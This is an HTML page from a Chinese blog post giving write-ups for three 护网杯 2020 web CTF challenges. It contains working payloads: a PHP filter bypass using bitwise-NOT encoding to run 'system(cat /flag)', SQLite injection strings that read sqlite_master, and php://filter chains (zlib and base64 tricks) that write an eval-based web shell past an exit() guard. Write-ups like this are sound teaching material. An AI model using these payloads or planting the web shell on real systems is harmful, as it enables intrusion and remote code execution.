@@ -1,0 +1,370 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>护网杯 | buxqm</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Ycj">
+    
+    <meta name="description" content="SimpleCalculator一道计算题，过滤了许多函数，这与2018年国赛那题很像，不过过滤了base_convert，可以使用取反绕过。
+12$pi=(~%8C%86%8C%8B%9A%92);$cos=(~%9C%9E%8B%DF%D0%99%93%9E%98);$pi($cos);$pi=">
+    
+    
+    
+    
+    <link rel="alternate" href="/atom.xml" title="buxqm" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/author.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/author.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="buxqm" title="buxqm"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="buxqm">buxqm</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/10/26/护网杯/" title="护网杯" itemprop="url">护网杯</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://yoursite.com" title="Ycj">Ycj</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2020-10-25T16:00:00.000Z" itemprop="datePublished">2020-10-26</time>
+    Updated:<time datetime="2020-10-26T10:30:43.497Z" itemprop="dateModified">2020-10-26</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SimpleCalculator"><span class="toc-number">1.</span> <span class="toc-text">SimpleCalculator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLManager"><span class="toc-number">2.</span> <span class="toc-text">SQLManager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyphp"><span class="toc-number">3.</span> <span class="toc-text">easyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解一：zlib过滤器"><span class="toc-number">3.1.</span> <span class="toc-text">解一：zlib过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解二：利用首页的include包含shell文件"><span class="toc-number">3.2.</span> <span class="toc-text">解二：利用首页的include包含shell文件</span></a></li></ol></li></ol>
+		</div>
+		
+		<h1 id="SimpleCalculator"><a href="#SimpleCalculator" class="headerlink" title="SimpleCalculator"></a>SimpleCalculator</h1><p>一道计算题，过滤了许多函数，这与2018年国赛那题很像，不过过滤了base_convert，可以使用取反绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pi=(~%8C%86%8C%8B%9A%92);$cos=(~%9C%9E%8B%DF%D0%99%93%9E%98);$pi($cos);</span><br><span class="line">$pi=system，$cos=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQLManager"><a href="#SQLManager" class="headerlink" title="SQLManager"></a>SQLManager</h1><p>这题是一道SQLLite注入，发现可以创建表名，发现和<a href="https://www.cnblogs.com/20175211lyz/p/12851905.html" target="_blank" rel="noopener">Zer0pts2020</a>很像，我们可以想到使用as来复制表，这里要说一下sqllite中的系统表sqlite_master，该表存储着当前数据库的所有表的相关信息，比如表的名称，创建表的sql语句等等。</p>
+<p>结果测试发现，该题表名不能含有单引号等特殊字符，所以我们可以使用中括号来包裹表名，让他复制sqllite_master来建表，从而得到sqllite_master中的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:[aaa] as select [sql][example] from sqlite_master;</span><br></pre></td></tr></table></figure>
+
+<p><img src="G:%5CMyBlog%5Csource%5Cimages%5C%E6%8A%A4%E7%BD%91%E6%9D%AF%5C8$G%5B%B%5DLDW%5B27BN6%7BNJG3L.png" alt="img"></p>
+<p>得到了flag的表名和列名，直接读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[aaa] as select [flag_ThE_C0lumn][example] from flag_Y0U_c4ng_GUESS;</span><br></pre></td></tr></table></figure>
+
+<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>打开，主界面存在一个任意文件包含，用伪协议读取一下源码，发现7fa3b767c460b54a2be4d49030b349c7.php，进入发现是一道绕过死亡exit的题目，死亡exit一般都是用过滤器混淆绕过，该题过滤了很多关键字，<a href="https://www.php.net/manual/zh/filters.string.php" target="_blank" rel="noopener">首先找找能用的过滤器</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i'</span>, $content)</span><br></pre></td></tr></table></figure>
+
+<h2 id="解一：zlib过滤器"><a href="#解一：zlib过滤器" class="headerlink" title="解一：zlib过滤器"></a>解一：zlib过滤器</h2><p>过滤了很多关键字，现在能用的过滤器只用string.strip_tags和压缩过滤器。</p>
+<p>strip_tags就不说了，首先试一试压缩过滤器的作用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/read=zlib.deflate/resource=1.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'aa'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.php就是下面这个正常的马，运行程序得到被压缩后的输出</p>
+<p><img src="G:%5CMyBlog%5Csource%5Cimages%5C%E6%8A%A4%E7%BD%91%E6%9D%AF%5Cimage-20201026162522535.png" alt="image-20201026162522535"></p>
+<p>那么我们将被压缩过的马url编码，之后能用zlib.unflate正常读取出来，还需要用?&gt;闭合之前的死亡exit;，使用strip_tags来将它过滤掉。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span>%B3%B1%<span class="number">2</span>F%C8%<span class="number">28</span>PpH-K%CC%D1P%<span class="number">89</span>%<span class="number">0</span>F%F0%<span class="number">0</span>F%<span class="number">0</span>E%<span class="number">89</span>VOLT%<span class="number">8</span>F%D5%B4%B6%B7%<span class="number">03</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:php://filter/write=string.strip_tags|zlib.inflate/%3f%3e%B3%B1%2F%C8%28PpH-K%CC%D1P%89%0F%F0%0F%0E%89VOLT%8F%D5%B4%B6%B7%03/resource=1.php</span><br></pre></td></tr></table></figure>
+
+<p>成功写入shell并将死亡exit过滤。</p>
+<h2 id="解二：利用首页的include包含shell文件"><a href="#解二：利用首页的include包含shell文件" class="headerlink" title="解二：利用首页的include包含shell文件"></a>解二：利用首页的include包含shell文件</h2><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节，之后在6位的前面补两个0，形成8位一个字节的形式。所以base64解密会四个字节四个字节读取，而PHP在base64解密时，会默认丢弃掉超出base64编码表的的字符，所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;PD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg==</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg==   &lt;?php @eval($_POST[&apos;aa&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在解码时会被看成如下字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpexitPD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>之前说到，会四个字节四个字节读取字符，而一个字符刚好就是一个字节，为了保证我们的马完整的被解出来，在它前面的字符串必须是四的倍数，而phpexit是7个字符，所以需要任意补足一个字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1hpexitPD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>之后在include用convert.base64-decode包含shell文件即可。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/专题-writeup/">专题  writeup</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://yoursite.com/2020/10/26/护网杯/" data-title="护网杯 | buxqm" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2020/10/20/nu1lctf2020/"  title="Nu1lCtf2020">
+ <strong>NEXT:</strong><br/> 
+ <span>Nu1lCtf2020
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SimpleCalculator"><span class="toc-number">1.</span> <span class="toc-text">SimpleCalculator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLManager"><span class="toc-number">2.</span> <span class="toc-text">SQLManager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyphp"><span class="toc-number">3.</span> <span class="toc-text">easyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解一：zlib过滤器"><span class="toc-number">3.1.</span> <span class="toc-text">解一：zlib过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解二：利用首页的include包含shell文件"><span class="toc-number">3.2.</span> <span class="toc-text">解二：利用首页的include包含shell文件</span></a></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/Nu1lCtf/" title="Nu1lCtf">Nu1lCtf<sup>1</sup></a></li>
+		
+			<li><a href="/categories/XXE/" title="XXE">XXE<sup>1</sup></a></li>
+		
+			<li><a href="/categories/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+		
+			<li><a href="/categories/trick/" title="trick">trick<sup>1</sup></a></li>
+		
+			<li><a href="/categories/writeup/" title="writeup">writeup<sup>2</sup></a></li>
+		
+			<li><a href="/categories/专题-writeup/" title="专题  writeup">专题  writeup<sup>2</sup></a></li>
+		
+			<li><a href="/categories/协议学习/" title="协议学习">协议学习<sup>1</sup></a></li>
+		
+			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>1</sup></a></li>
+		
+			<li><a href="/categories/西湖论剑/" title="西湖论剑">西湖论剑<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello <br/>
+			似水流年</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
+		
+		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:""};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+  </body>
+</html>
